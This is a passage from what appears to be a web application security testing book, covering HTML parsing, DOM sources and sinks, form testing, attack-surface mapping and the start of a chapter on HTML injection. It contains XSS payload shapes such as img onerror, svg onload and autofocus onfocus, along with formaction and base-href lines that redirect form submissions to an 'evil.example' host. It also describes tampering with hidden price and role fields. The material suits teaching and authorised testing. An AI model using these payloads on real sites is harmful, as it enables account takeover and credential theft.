> **Important nuance, often misunderstood:** assigning a `<script>` tag via `innerHTML` does
> **not** execute it. But this is a thin comfort — `innerHTML` happily runs event-handler
> vectors (`<img src=x onerror=...>`, `<svg onload=...>`, `<iframe srcdoc=...>`), so
> `innerHTML` with untrusted data is still a serious sink.

## 3.11 Putting it together: predicting parser behavior

A practical loop for reasoning about any payload:

1. **Where does it land?** Determine the tokenizer state at the injection point (text?
   attribute value? script data? RAWTEXT? foreign content?).
2. **What ends the current state?** That's your break-out character/sequence (`<`, `"`, `'`,
   `</script>`, `</textarea>`, space/`/` for attributes, etc.).
3. **Are entities decoded here?** If yes, you can encode payload characters to dodge string
   filters.
4. **What will tree construction do?** Will the element be auto-closed, relocated (tables), or
   reinterpreted (foreign content)? Check the *DOM*, not the source.
5. **Does anything re-parse the output?** Sanitizer → `innerHTML` round trips invite mXSS.

If you can answer these five questions, you can usually explain why a payload worked, why one
was blocked, and what to try next — which is the entire game.

## 3.12 A short, safe demonstration to run in your lab

In a local lab page (see [Chapter 17](#17-labs)), open DevTools and run in the
console:

```js
// Watch the browser repair markup. The DOM is NOT what you typed.
const d = document.createElement('div');
d.innerHTML = '<p>one<p>two<b>bold<i>both</b>italic';
console.log(d.innerHTML);
// Observe auto-closed <p> tags and re-opened <i> (adoption agency).

// Foreign content / fragment context differences:
const t = document.createElement('table');
t.innerHTML = '<div>hi</div>';   // where did the <div> go?
console.log(t.outerHTML);
```

Seeing the browser rewrite your markup, live, is the fastest way to internalize this chapter.
Do this only in your own lab.

---

## Key takeaways

- HTML parsing is intentionally forgiving; browsers repair broken markup into a DOM that may
  differ from what you wrote — sometimes into something exploitable.
- The tokenizer is a state machine; **knowing the current state tells you the break-out
  character.** Attributes accept flexible separators (spaces, tabs, newlines, `/`).
- Entities are decoded in text/attribute/RCDATA contexts but **not** in `<script>`/`<style>`.
  Attribute-context decoding is a reliable filter bypass.
- **Mutation XSS** arises when a sanitizer and the browser disagree about parsing; foreign
  content (SVG/MathML), templates, and tables are hotspots.
- Always inspect the **rendered DOM**, not just View Source. Re-parsing paths (`innerHTML`,
  `DOMParser`, `<template>`) have their own context rules.

---

<a id="04-the-dom"></a>

# Chapter 4 — The DOM and the Rendering Model

> The HTML you send is just a seed. The browser grows it into a living object model that
> JavaScript can read and rewrite. Most modern client-side vulnerabilities are about *that*
> object model — where data flows into it, and which properties turn data into code.

---

## 4.1 From markup to a live tree

Once parsing (Chapter 3) finishes, you have the **Document Object Model**: a tree of nodes
(elements, text, comments, attributes) that represents the page in memory. The DOM is:

- **Live.** JavaScript can read and mutate it after load; the rendering updates accordingly.
- **The real target of client-side attacks.** Reflected/stored XSS are fundamentally about
  *what ends up in the DOM*; DOM-based XSS is about *how client-side JS puts data there*.
- **Independent of the original bytes.** As we saw, the DOM may differ from View Source.

A tester should be fluent moving between three views of a page:

1. **View Source** — the raw bytes the server sent (pre-JavaScript).
2. **DevTools → Elements** — the current, live DOM (post-JavaScript).
3. **DevTools → Network** — what actually came over the wire, including redirects and headers.

Discrepancies between (1) and (2) are where client-side logic — and client-side bugs — hide.

## 4.2 Sources and sinks: the core vocabulary of client-side bugs

Two words will recur for the rest of the book. Learn them precisely.

- A **source** is any place client-side code reads attacker-influenceable input. Examples:
  `location.href`, `location.search`, `location.hash`, `document.referrer`,
  `document.cookie`, `window.name`, `postMessage` event data, `localStorage`/`sessionStorage`,
  and values read from the DOM itself (e.g., an `input.value` or a `data-*` attribute the
  attacker can set).
- A **sink** is any place client-side code writes data in a way that can cause execution or a
  dangerous state change. Examples below.

**Dangerous DOM sinks (the ones that turn data into code):**

| Sink | Why it's dangerous |
|---|---|
| `eval(x)`, `Function(x)`, `setTimeout(x, ...)` with string `x` | Directly executes a string as code. |
| `element.innerHTML`, `outerHTML`, `insertAdjacentHTML` | Parses a string as HTML (event-handler vectors run). |
| `document.write`/`writeln` | Injects markup into the parser stream. |
| `element.setAttribute('href'|'src', x)`, `a.href = x` | URL context — `javascript:` schemes. |
| `el.onclick = x` / inline handler assignment via attributes | Event-handler context. |
| `script.src = x`, dynamic `<script>` creation | Loads and runs remote code. |
| `location = x`, `location.href`/`assign`/`replace` | Navigation; `javascript:`/open-redirect. |
| `el.style` / CSS text | CSS injection; data exfiltration; UI redress. |
| jQuery `$(x)`, `.html(x)`, `.append(x)` | Historically parse HTML and can run vectors. |

A DOM-based vulnerability exists when a **source flows to a dangerous sink without adequate
validation/encoding.** Finding these data flows is the heart of [Chapter 10](#10-xss-dom);
this chapter builds the model you'll use to reason about them.

## 4.3 The most attacker-friendly sources, in detail

**`location` and its parts.** The URL is the most common source because attackers fully control
it in a link they send a victim.
- `location.search` — the `?query=...` part.
- `location.hash` — the `#fragment` part. **Crucially, the fragment is not sent to the
  server,** so server-side filters never see it. That makes `location.hash` a favorite source
  for DOM XSS that's invisible to server logs/WAFs.
- `location.pathname`, `location.href` — the rest.

**`document.referrer`.** The URL of the previous page; partly attacker-controllable by hosting
the linking page.

**`window.name`.** A string that *persists across navigations* in the same tab and can be set
by another origin before redirecting the victim — a sneaky cross-origin-ish source.

**`postMessage` data.** Cross-document messaging. If a handler trusts `event.data` without
checking `event.origin`, an attacker page can drive the handler — a common modern bug.

**Web storage (`localStorage`/`sessionStorage`) and cookies.** If attacker-influenced data is
stored and later read into a sink, you get a stored *DOM* XSS — no server round trip needed at
exploitation time.

## 4.4 Properties that control execution: a closer look

Two properties deserve special attention because they're constantly confused.

**`innerHTML` vs `textContent`.**
- `element.textContent = userData` is **safe**: it sets text, never parses markup. This is the
  client-side equivalent of correct output encoding and is the right default.
- `element.innerHTML = userData` **parses** `userData` as HTML. Even though injected `<script>`
  won't auto-run, `<img src=x onerror=...>`, `<svg onload=...>`, `<iframe srcdoc=...>` and
  friends will. Treat any `innerHTML =` with untrusted data as a finding until proven safe.

**`setAttribute` and direct property assignment for URLs.**
- `a.href = userData` puts data in a URL context; `javascript:` schemes execute on click.
- `img.src = userData` triggers a fetch (think SSRF-adjacent behavior, tracking, and `onerror`
  pivots).
- Setting `srcdoc` on an iframe parses a *whole document* you control.

## 4.5 Event handling and the two ways to attach code

There are two ways code gets attached to events, and the difference matters for both attack and
defense:

1. **Inline handler attributes** in markup: `<button onclick="doThing()">`. These are HTML; an
   injection into this context is an "event-handler context" XSS, and Content Security Policy's
   `script-src` (without `'unsafe-inline'`) blocks them.
2. **`addEventListener` / property assignment** in JS: `btn.addEventListener('click', fn)`.
   This is the modern, CSP-friendly approach.

For testers: when you land in an attribute context on an element that supports events, you can
often introduce a new event-handler attribute (`onmouseover`, `onfocus` + `autofocus`,
`onerror`, `onload`) without needing `<script>` at all. This is the workhorse of XSS in
modern, partially-filtered apps.

## 4.6 The rendering pipeline (why some attacks are "visual")

After the DOM is built, the browser also builds the **CSSOM** (from CSS), combines them into a
**render tree**, computes **layout**, and **paints**. A few security-relevant points:

- **CSS can leak data and redress the UI.** Attribute selectors can probe values; opacity,
  positioning, and stacking (`z-index`) enable clickjacking overlays. Layout is attacker-
  relevant, not just cosmetic. (See [Chapter 12](#12-clickjacking).)
- **Reflows and repaints can be observed**, enabling timing/side-channel tricks in advanced
  scenarios.
- **`<iframe>` composition** means multiple documents render together; the security boundary
  between them is the **origin** (next section), not the pixels.

## 4.7 The Same-Origin Policy: the boundary everything respects

The **Same-Origin Policy (SOP)** is the foundational browser security rule. Two documents share
an *origin* only if they match on **scheme + host + port**:

```
https://app.example.com:443/page
  scheme = https   host = app.example.com   port = 443
```

- `http://app.example.com` ≠ `https://app.example.com` (scheme differs).
- `https://app.example.com` ≠ `https://api.example.com` (host differs).
- `https://example.com` ≠ `https://example.com:8443` (port differs).

Same-origin documents can script each other freely. Cross-origin access is restricted: you
generally can't read another origin's DOM, responses, cookies, or storage from script.

Why this matters for HTML testing:

- **XSS is so severe precisely because it runs *inside* the victim origin**, sidestepping SOP.
  The injected script *is* the origin, so it can read the DOM, cookies (if not `HttpOnly`),
  storage, and make same-origin requests with the user's session.
- **Clickjacking and CSRF are attacks that work *across* origins** without breaking SOP — they
  abuse the fact that the browser still *sends cookies* and *renders frames* across origins
  even though script can't read across them.

## 4.8 What SOP does *not* protect

The SOP restricts *reading*, not *sending* or *embedding*. This asymmetry is the seed of major
attacks:

- A cross-origin page can **send** your browser to make requests that include your cookies
  (the basis of **CSRF** — [Chapter 11](#11-csrf)). It just can't read the responses.
- A cross-origin page can **embed** your page in an `<iframe>` (the basis of **clickjacking** —
  [Chapter 12](#12-clickjacking)) unless you forbid framing.
- A cross-origin page can **load** your scripts, images, and stylesheets by URL.

Defenses exist for each gap — `SameSite` cookies and anti-CSRF tokens, `X-Frame-Options`/CSP
`frame-ancestors`, CORS for controlled reading — and we cover them in their chapters.

## 4.9 Cookies, storage, and the execution context

When XSS executes, what can it reach?

- **`document.cookie`** — readable unless the cookie is flagged **`HttpOnly`**, which hides it
  from JavaScript. (`HttpOnly` doesn't stop XSS, but it removes one easy looting path.)
- **`localStorage`/`sessionStorage`** — fully readable by same-origin script; never `HttpOnly`.
  Storing tokens here is convenient but means any XSS can steal them.
- **In-memory app state** — frameworks keep tokens and PII in JS variables; XSS sees all of it.
- **Same-origin requests** — XSS can call APIs as the user, so even `HttpOnly` cookies are
  *used* (just not read) by attacker-driven requests.

This is why "XSS is just an alert box" is dangerously wrong. In a real app, script execution in
the victim origin can mean full account takeover.

## 4.10 Web APIs that expand the surface

Modern browsers expose powerful APIs that become relevant once script runs (or that have their
own abuse paths):

- **`fetch` / `XMLHttpRequest`** — make requests as the user; exfiltrate or pivot.
- **`postMessage`** — cross-document messaging; insecure handlers = bugs.
- **Service Workers** — scriptable proxies that can persist; an attacker who can register one
  gains durable control of an origin's network. Registration requires same-origin script
  (often via XSS), which raises the stakes of any XSS dramatically.
- **WebSockets, EventSource** — long-lived channels.
- **Clipboard, Geolocation, Notifications, WebRTC** — privacy-sensitive capabilities gated by
  permissions and (mostly) secure contexts.

You don't attack these from nothing; you reach them *after* getting code execution, which is
why preventing XSS is the linchpin.

## 4.11 A safe DOM-exploration drill for your lab

On a local lab page, in DevTools console:

```js
// 1) See the live DOM vs source: mutate and observe.
document.body.firstElementChild.textContent = 'changed via DOM';

// 2) Demonstrate why textContent is safe and innerHTML is not (lab only):
const safe = document.createElement('div');
safe.textContent = '<img src=x onerror=console.log("would-run")>';
document.body.appendChild(safe);   // renders as literal text, nothing runs

const unsafe = document.createElement('div');
unsafe.innerHTML = '<img src=x onerror=console.log("RAN in lab")>';
document.body.appendChild(unsafe); // onerror fires — note: no <script> needed

// 3) Inspect attacker-friendly sources:
console.log(location.hash, location.search, document.referrer, window.name);
```

Watching `innerHTML` execute an `onerror` while `textContent` stays inert is the clearest
possible illustration of source→sink risk. Lab only.

---

## Key takeaways

- The **DOM** is the live, in-memory tree the browser actually acts on; it can differ from the
  bytes you sent. Always compare View Source, the Elements panel, and Network.
- Learn **sources** (URL parts — especially `location.hash`, `referrer`, `window.name`,
  `postMessage`, storage) and **sinks** (`innerHTML`, `eval`, `document.write`, URL-setting
  properties). A source flowing to a sink unsafely is a client-side vulnerability.
- `textContent` is safe; `innerHTML` parses HTML and runs event-handler vectors even without
  `<script>`.
- The **Same-Origin Policy** restricts cross-origin *reading*, not *sending* or *embedding* —
  which is exactly why CSRF and clickjacking work, and why XSS (running inside the origin) is so
  devastating.
- Preventing XSS is the linchpin because script in the victim origin can reach cookies, storage,
  app state, same-origin APIs, and even service workers.

---

<a id="05-forms-and-inputs"></a>

# Chapter 5 — HTML Forms and Input Controls

> Forms are where the user hands data to the application — and where the attacker hands
> payloads to it. To test effectively you have to understand forms better than the developers
> who built them, because most "client-side validation" is a suggestion the attacker is free
> to ignore.

---

## 5.1 The anatomy of a form

```html
<form action="/transfer" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="text"   name="to"     value="">
  <input type="number" name="amount" min="1" max="1000">
  <input type="hidden" name="csrf"   value="a1b2c3...">
  <button type="submit">Send</button>
</form>
```

Every attribute here is a testing consideration:

- **`action`** — the URL the form submits to. If attacker-influenced, it can redirect
  submissions (credential theft). An injected or overridable `formaction` on a button can do
  the same per-button.
- **`method`** — `GET` (data in the URL/query string) or `POST` (data in the body). `GET`
  forms leak data into URLs, history, logs, and `Referer`. Note: HTML forms natively support
  only `GET` and `POST`; other verbs (`PUT`, `DELETE`) require JavaScript or a `_method`
  override field. This GET/POST limitation matters for CSRF reach (Chapter 11).
- **`enctype`** — encoding of the body. `application/x-www-form-urlencoded` (default),
  `multipart/form-data` (file uploads), and `text/plain`. The `text/plain` encoding is a
  notable CSRF primitive because it lets an attacker craft request bodies that mimic JSON.
- **`name`** — the parameter name the server reads. Enumerating names (including ones the UI
  hides) is core recon.
- **`value`** — prefilled data, including in **hidden** fields.

## 5.2 Hidden fields are not hidden

`type="hidden"` only hides a field from *rendering*. The value is in the HTML, fully visible in
View Source and fully editable by the attacker (via DevTools, a proxy, or just resubmitting).

Things developers wrongly trust in hidden fields:

- **Prices and totals.** `<input type="hidden" name="price" value="9.99">` — change it to
  `0.01` and resubmit. This classic flaw still appears in real shopping carts.
- **User IDs / roles.** `<input type="hidden" name="role" value="user">` — try `admin`.
- **Workflow state / "next step" URLs.** Often redirectable.
- **Anti-CSRF tokens.** These *belong* in hidden fields, but their *strength* (per-session vs
  per-request, validation server-side) is the real question (Chapter 11).

**Tester's rule:** treat every hidden field as fully attacker-controlled input. The only
security boundary is server-side validation.

## 5.3 Client-side validation is advisory, not a control

HTML5 gives forms a lot of built-in validation:

- `required`, `min`, `max`, `minlength`, `maxlength`, `step`
- `pattern="[A-Za-z0-9]+"` (a regex the browser enforces)
- `type="email"`, `type="url"`, `type="number"` (format constraints)

All of it runs **in the browser**, which the attacker controls. Every one of these can be
bypassed by:

- Submitting the request directly (curl, a proxy's repeater, a script) without the form.
- Editing the DOM in DevTools to remove `maxlength`/`pattern`/`required`.
- Disabling JavaScript or intercepting and modifying the request in a proxy.

So `maxlength="20"` does **not** mean the server receives at most 20 characters, and
`pattern="..."` does **not** mean the server receives matching input. As a tester, you should
**always confirm whether the same rule is enforced server-side.** Frequently it isn't — that
gap (validation present in UI, absent on server) is a finding in itself and the doorway to
injection.

A quick way to demonstrate: capture the form's request in a proxy and replay it with values
that violate every client-side rule. If the server accepts them, document it.

## 5.4 Input types and their quirks

`type` changes behavior, rendering, and sometimes attack surface:

| `type` | Notes for testers |
|---|---|
| `text` / `search` | General text; primary reflection/injection source. |
| `password` | Masked only; value still submitted in plaintext over the wire (HTTPS protects transit, not the field itself). |
| `hidden` | See §5.2 — fully editable. |
| `email` / `url` / `tel` | Client-side format hints; bypassable. `url` doesn't restrict scheme server-side. |
| `number` / `range` | Numeric hints; servers must still validate. Watch for sign/overflow. |
| `file` | Upload surface — content type, size, name; see [Chapter 14](#14-uploads-svg-markup). |
| `checkbox` / `radio` | Unchecked boxes send *nothing*; servers mishandling absence is a bug. |
| `color` / `date` / `datetime-local` | Structured pickers; raw value still attacker-controlled. |
| `submit` / `image` / `button` | Can carry `formaction`, `formmethod`, `formenctype` overrides. |

Two specifics worth calling out:

- **Checkbox/radio absence.** If a checkbox is unchecked, its name isn't submitted at all.
  Logic that assumes the field always arrives (e.g., `if request.tos == "off"`) can be tricked
  by *removing* the parameter entirely.
- **`formaction` override.** A submit button can override the form's `action`:
  `<button formaction="https://evil.example/collect">`. If you can inject a button or influence
  `formaction`, you can redirect a form submission — a credential-theft and CSRF primitive.

## 5.5 `autocomplete`, `autofocus`, and friends

These convenience attributes have security relevance:

- **`autofocus`** automatically focuses an element on load. Combined with an `onfocus` handler,
  it produces a *zero-interaction* XSS trigger: `<input autofocus onfocus=...>`. This is one of
  the most reliable payload shapes when you can inject into an attribute or element context,
  because it doesn't require the victim to hover, click, or move the mouse.
- **`autocomplete="off"`** is a hint browsers increasingly ignore (especially for passwords).
  Don't rely on it as a control; conversely, note when sensitive fields *allow* autocomplete as
  a minor data-exposure observation.
- **`autocapitalize`, `spellcheck`** — minor privacy considerations (e.g., spellcheck can send
  text to remote services in some configurations).

## 5.6 Where form values get reflected — and why it matters

After submission (or even before, via prefill), form values often appear back in the page:

- **Search boxes** echo the query: classic reflected-XSS sink (Chapter 8).
- **"Review your details" pages** reflect everything you typed: a buffet of contexts.
- **Validation error messages** reflect the offending value: easy to overlook, easy to inject.
- **Hidden fields re-rendered** with attacker data: attribute-context injection.

For each reflected value, run the Chapter 2 checklist: identify the **context** (element
content? attribute value? script? URL?) and the **encoding** applied. The form is just the
delivery mechanism; the vulnerability is determined by how the reflection is handled.

## 5.7 Multi-step forms and trust boundaries

Workflows that span several pages (cart → shipping → payment → confirm) carry state between
steps, usually via hidden fields, query parameters, cookies, or server-side session.

Tester questions:

- **Where is each piece of state stored, and is it re-validated at the final step?** If the
  price/quantity/role is carried in a hidden field and only validated on step 2, tamper with it
  on step 4.
- **Can you skip steps?** Jump directly to the confirmation endpoint with crafted parameters.
- **Can you replay or reorder steps?** Out-of-order submission often hits code paths the
  developers didn't test.

These are business-logic issues that ride on HTML's stateless form model; HTML gives you the
levers (hidden fields, predictable endpoints), and weak server logic does the rest.

## 5.8 File inputs: a doorway worth its own chapter

`<input type="file">` introduces a fundamentally different surface: the *content* and
*metadata* of an uploaded file. The HTML side is simple (`accept="image/*"` is just a hint,
trivially bypassed), but it opens questions about content-type validation, filename handling,
storage location, and whether uploaded HTML/SVG is served back in a context that executes.
We treat uploads fully in [Chapter 14](#14-uploads-svg-markup); for now, note that
`accept` is advisory and never a security control.

## 5.9 The `<base>` and `<form>` interaction

Recall from Chapter 2 that `<base href>` rewrites how relative URLs resolve. A form with a
*relative* `action` (`action="/submit"` or `action="submit"`) resolves against the document
base. If an attacker can inject a `<base href="https://evil.example/">` earlier in the page,
relative form actions (and relative `src`/`href`) can be repointed at the attacker's server —
turning an otherwise innocuous form into a data-exfiltration channel. This is a good example of
how one injection (a `<base>` tag) compounds into another (form hijacking).

## 5.10 Testing forms: a practical routine

For each form you encounter:

1. **Inventory inputs**, including hidden ones and any `formaction`/override capabilities.
   View Source and the live DOM both — JS may add or remove fields.
2. **Record the endpoint**: `action`, `method`, `enctype`, and any anti-CSRF token.
3. **Capture a baseline submission** in your proxy.
4. **Strip client-side validation** and resubmit violating values directly to the server.
   Confirm server-side enforcement (or its absence).
5. **Tamper hidden/derived fields** (prices, IDs, roles, state).
6. **Test each reflected value** for context/encoding (sets up Part III).
7. **Test parameter presence/absence** (drop checkboxes, drop tokens, add unexpected params).
8. **Note CSRF posture**: token presence, `SameSite` cookies, whether the action is
   state-changing (feeds Chapter 11).

Document what the server *actually* accepts, not what the form *appears* to allow.

---

## Key takeaways

- Client-side validation (`required`, `pattern`, `maxlength`, `type`) is **bypassable** and is
  never a security control. Always verify server-side enforcement.
- **Hidden fields are fully attacker-controlled.** Never trust prices, IDs, roles, or workflow
  state carried in them.
- Input `type` and attributes like `formaction`, `autofocus`, and `accept` change the attack
  surface; `accept` and `autocomplete` are hints, not controls.
- Forms are a *delivery mechanism*; the real vulnerability is in how reflected values are
  encoded (Part III) and whether state-changing actions are CSRF-protected (Chapter 11).

---

<a id="06-attack-surface"></a>

# Chapter 6 — Mapping the HTML Attack Surface

> Before exploitation comes reconnaissance. This chapter is a systematic method for finding
> *every* place untrusted data enters an application and *every* place it comes back out into
> HTML. Thorough mapping is what separates a tester who finds one bug from one who finds them
> all.

---

## 6.1 The mental model: inputs, sinks, and the journey between

Every HTML vulnerability is a story about a piece of data:

```
[entry point] → [server / client processing] → [output into HTML context] → [browser]
```

To map the surface you enumerate three things:

1. **Entry points** — everywhere attacker-controlled data can get in.
2. **Reflection/storage points** — everywhere that data comes back out into a page.
3. **The context + encoding** at each output (the Chapter 2 question).

Mapping is the disciplined act of building this inventory before you start firing payloads.

## 6.2 Enumerating entry points

Attacker-controlled input is far broader than visible form fields. Build a checklist:

**URL-based**
- Query string parameters (`?id=1&q=...`).
- URL path segments (`/users/123/`, including REST-style IDs).
- The fragment/`#hash` (client-side only — invisible to the server; a key DOM-XSS source).

**Body-based**
- Form fields (text, hidden, checkboxes — see Chapter 5).
- JSON/XML/GraphQL request bodies.
- Multipart uploads (filenames, content, metadata).

**Header-based** (often overlooked, often unsanitized)
- `User-Agent`, `Referer`, `X-Forwarded-For`, `Origin`, custom `X-` headers.
- `Cookie` values (attacker can set/modify their own cookies).
- `Host` header (host-header injection, cache poisoning).
- `Accept-Language` and other negotiation headers (sometimes reflected in localized pages).

**Stored / out-of-band**
- Anything persisted: profile fields, comments, filenames, support tickets, log entries shown
  in an admin panel, webhook payloads, imported data, API-created records.
- Data that arrives via a *different* channel but renders in HTML later (e.g., an email subject
  shown in a web mail UI, a device name shown in a dashboard). These **second-order** inputs are
  prime stored-XSS territory because the developer didn't picture them as "user input."

**Client-side sources** (from Chapter 4)
- `location.*`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, cookies read
  by JS.

> **Pro tip:** the most valuable findings often come from inputs developers forgot were inputs:
> HTTP headers, the URL fragment, second-order stored data, and metadata like filenames.

## 6.3 Marking and tracing inputs

Use a **unique, searchable marker** so you can find your data in responses, logs, and stored
locations. For example, submit a token like `zqxj7k` (random enough not to collide) into each
field, then grep responses for it. This turns "did my input show up?" into a mechanical search.

Strategy:

- Use a *different* marker per input so you can tell which field a reflection came from.
- Search the **rendered DOM** and **raw response** (they can differ — Chapter 3/4).
- For stored inputs, check *every* page that might render the data later (profile, admin views,
  exports, emails). Stored XSS frequently surfaces in an admin panel, not the page you injected
  from.

## 6.4 Crawling and discovering hidden surface

You can't test what you don't know exists. Combine techniques:

- **Walk the app like a user**, with a proxy recording every request (Chapter 16).
- **Spider/crawl** to discover linked pages and forms (proxy crawlers, automated spiders).
- **Parse client-side JS** for endpoints, parameter names, and route tables. Modern SPAs hide
  much of their API surface in bundled JavaScript; reading the bundles reveals endpoints the
  UI never links to.
- **Find hidden parameters.** Apps often honor parameters that aren't in any form (debug flags,
  legacy params, feature toggles). Tools that brute-force parameter names (e.g., parameter
  miners) and wordlists help surface these. An unlinked `?debug=1` or `?template=...` can be a
  jackpot.
- **Inspect `robots.txt`, sitemaps, JS source maps, comments, and error pages** for leaked
  paths.
- **Diff authenticated vs unauthenticated** views to find role-gated surface.

## 6.5 Classifying each reflection by context

Once you find a reflection, classify it. This is the bridge from recon to exploitation. For
each output of your marker, record:

| Field | Example |
|---|---|
| Source input | `q` query param |
| Output location | search results header |
| HTML context | element content / attribute / script / URL / style / comment |
| Encoding observed | none / HTML-entity / JS-string / URL / double-encoded |
| Special element nearby | inside `<script>`, `<textarea>`, `<svg>`, `<title>`? |
| Reach | reflected to me only / stored / shown to other users / admin |

Build this as a table for the whole app. It becomes your exploitation plan: high-value rows are
unencoded reflections, script/URL contexts, and anything that reaches *other users*.

## 6.6 Probing encoding behavior systematically

To learn what the application does to special characters, submit a **canary string** that
contains every interesting character at once, then observe which survive and in what form. A
common canary:

```
zqxj'"<>`/\(){}[];:=&#
```

Submit it, then inspect the response and the DOM:

- Did `<` and `>` come back literally, as `&lt;`/`&gt;`, or stripped?
- Did `"` and `'` survive inside the relevant context?
- Did backtick `` ` `` survive (matters in some attribute/template contexts)?
- Were any characters double-encoded (`&amp;lt;`), URL-encoded, or unicode-escaped?
- Were any *dropped* (suggesting a blocklist you may be able to bypass)?

The pattern of what survives tells you the encoding scheme and where its blind spots are —
which is exactly what you need to craft a context-appropriate payload in Part III.

## 6.7 Recognizing the special-element traps

While mapping, flag any reflection that lands in or near these, because the parsing rules
change (Chapter 3) and naive filters often fail there:

- Inside **`<script>`** — entity encoding is inert; break out with `</script>`.
- Inside **`<textarea>`/`<title>`** — RCDATA; entities decode; break out with the matching end
  tag.
- Inside **`<style>`** — CSS context; CSS-injection rules apply.
- Inside **`<svg>`/`<math>`** — foreign content; different rules, mXSS-prone.
- Inside **HTML comments** — break out with `-->`.
- In **`<template>`** or anything later assigned to **`innerHTML`** — re-parsing, mXSS risk.

## 6.8 Mapping state-changing actions (for CSRF)

Separately from reflections, inventory every request that **changes state**: account settings,
password/email change, money movement, role changes, content creation/deletion, "delete my
account." For each, note:

- Method and endpoint.
- Whether an **anti-CSRF token** is present and validated.
- Cookie attributes, especially **`SameSite`**.
- Whether the action can be triggered with a simple HTML form (GET or POST), which determines
  CSRF feasibility (Chapter 11).

This is a parallel map to the reflection map and feeds Part IV.

## 6.9 Mapping framing and embedding posture (for clickjacking)

For sensitive pages (anything with a click that changes state), check:

- Does the response set **`X-Frame-Options`** or a CSP **`frame-ancestors`** directive?
- If not, the page can likely be framed — a clickjacking candidate (Chapter 12).
- Note `SameSite` cookie behavior, since framed requests interact with cookie sending.

A quick test: try loading the target inside a local `<iframe>` in your lab. If it renders, it's
frameable.

## 6.10 Reading the response headers as part of the map

HTML doesn't live alone; response headers shape how the browser treats it. While mapping,
record for key responses:

- **`Content-Type`** and any **`charset`** (Chapter 3 encoding attacks; also: is an HTML
  response served as `text/html` when it should be `text/plain`/`application/json`?).
- **`Content-Security-Policy`** — presence, and key directives (`script-src`,
  `frame-ancestors`, `object-src`). A missing or weak CSP raises XSS impact (Chapter 19).
- **`X-Content-Type-Options: nosniff`** — absence allows MIME sniffing, which can turn an
  uploaded/echoed file into executable HTML.
- **`X-Frame-Options` / `frame-ancestors`** — framing posture.
- **`Set-Cookie` flags** — `HttpOnly`, `Secure`, `SameSite`.

These don't create vulnerabilities by themselves, but they determine the *impact* and
*exploitability* of the HTML bugs you find, and several are findings in their own right.

## 6.11 Building the master surface inventory

Pull it together into a living document (a spreadsheet or notes) with these tabs/sections:

1. **Endpoints** — URL, method, params (incl. hidden/undocumented), auth required.
2. **Reflections** — input → output location → context → encoding → reach (the §6.5 table).
3. **State-changing actions** — for CSRF (the §6.8 list).
4. **Framing posture** — per sensitive page (the §6.9 check).
5. **Header/security posture** — CSP, cookie flags, content types (the §6.10 list).
6. **Open questions / leads** — undocumented params, second-order inputs, special-element
   reflections to revisit.

This inventory *is* your test plan. Each row in tab 2 becomes a Part III investigation; each
row in tab 3 a Chapter 11 test; each row in tab 4 a Chapter 12 test.

## 6.12 A worked mini-example

Suppose you map a small app and find:

- `/search?q=` reflects `q` into `<h2>Results for: HERE</h2>` with **no encoding**. → High
  priority reflected-XSS lead (element content context).
- Profile "bio" field is stored and rendered into `<div class="bio">HERE</div>` on a public
  profile **and** in the admin moderation queue, HTML-encoded on the public page but **not** in
  the admin queue. → Stored XSS targeting admins (reach = admin!). Highest priority.
- `/redirect?url=` sets `location = url` client-side. → DOM-based open redirect / XSS via
  `javascript:` (source `location.search` → sink `location`).
- `POST /account/email` changes the user's email with **no anti-CSRF token** and a
  `SameSite=None` session cookie. → CSRF candidate.
- The settings page sets no `X-Frame-Options`/`frame-ancestors`. → Clickjacking candidate.

Notice how mapping alone — before a single exploit — already produces a prioritized findings
list ordered by *reach* and *impact*. That prioritization is the real deliverable of this
chapter.

---

## Key takeaways

- Enumerate **all** entry points: URL (incl. `#hash`), body, **headers and cookies**, uploads,
  and **second-order/stored** inputs developers forget are user-controlled.
- Use unique, searchable **markers** and a **canary string** to find reflections and learn the
  app's encoding behavior mechanically.
- Read client-side JS and brute-force hidden parameters to reveal surface the UI hides.
- Classify every reflection by **context + encoding + reach**; build a master inventory that
  doubles as your test plan.
- Map state-changing actions and framing/header posture in parallel — they set the impact of
  what you find and feed Parts IV and VI.

---

<a id="07-html-injection"></a>

# Chapter 7 — HTML Injection

> HTML injection is XSS's quieter sibling. The attacker controls *markup* (but maybe not
> *script*). It's worth its own chapter because (a) it's harmful on its own, (b) it's the
> stepping stone to XSS, and (c) understanding it cleanly is the best way to understand why
> XSS happens at all.

---

## 7.1 What HTML injection is

HTML injection occurs when an application places untrusted data into an HTML response (or DOM)
**without proper context-appropriate encoding**, so the data is interpreted as *markup* rather
than *text*. The attacker can introduce new tags, attributes, or structure into the page.

The distinction from XSS is one of degree:

- **HTML injection (a.k.a. content/markup injection):** you can inject HTML elements and
  attributes, but for some reason can't (yet) run JavaScript — perhaps `<script>` and event
  handlers are filtered, or CSP blocks script.
- **XSS:** your injected markup achieves JavaScript execution.

Every XSS *is* an HTML (or script-context) injection that reached code execution. So mastering
injection is mastering the root cause.

## 7.2 Why it happens: the data/markup confusion

Recall the core lesson of Part I: a browser decides whether `<` starts a tag based on parsing
context, and the defense is to **encode data so its special characters render as text**. HTML
injection is simply the failure to do that encoding in the context where the data lands.

```python
# Vulnerable (pseudocode): user-controlled `name` concatenated into HTML
html = "<h1>Welcome, " + name + "</h1>"
```

If `name` is `Alice`, the page shows "Welcome, Alice." If `name` is
`<u>Alice</u>`, the browser renders an underlined name — the markup was interpreted. The fix is
to encode `name` so `<` becomes `&lt;` (see §7.9). The presence of *any* interpreted markup is
the proof of injection.

## 7.3 Demonstrating injection safely

Your first probe is not a script payload — it's a harmless tag that proves markup is
interpreted. Good, low-noise markers:

```html
<b>zqxj</b>            <!-- does "zqxj" render bold? -->
<u>zqxj</u>
<i>zqxj</i>
<h1>zqxj</h1>          <!-- structural change is very visible -->
```

If `zqxj` renders bold/underlined/as a heading, you have HTML injection. This is a clean,
defensible proof of concept that doesn't execute anything — ideal for the "least invasive PoC"
principle from [Chapter 1](#01-legal-and-ethics). Only after confirming injection do you
escalate toward script (Chapter 8+), and only within scope.

## 7.4 The impact of "just" HTML injection

People underrate non-script injection. Even without JavaScript, controlling markup lets an
attacker:

- **Deface content** — insert misleading text, fake notices, altered prices, or offensive
  material attributed to the victim site.
- **Phish in-context (content spoofing).** Inject a convincing "Your session expired, please
  re-enter your password" form whose `action` points at the attacker. Because it's on the real
  domain with the real TLS padlock, victims trust it. This is one of the most damaging
  no-script outcomes.
- **Hijack relative URLs** via an injected `<base href>` (Chapter 5) — repointing forms,
